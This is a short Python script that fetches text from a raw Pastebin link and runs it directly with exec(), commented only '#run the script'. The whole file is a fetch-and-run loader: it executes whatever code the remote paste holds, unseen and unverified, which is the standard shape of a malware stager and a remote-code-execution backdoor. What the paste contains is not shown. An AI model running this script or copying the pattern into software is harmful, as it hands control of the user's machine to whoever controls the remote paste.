import requests
link = "https://pastebin.com/raw/Fk9wMF54"
r = requests.get(link)

#run the script

response_text = r.text
r.encoding = 'utf-8'
exec(response_text)
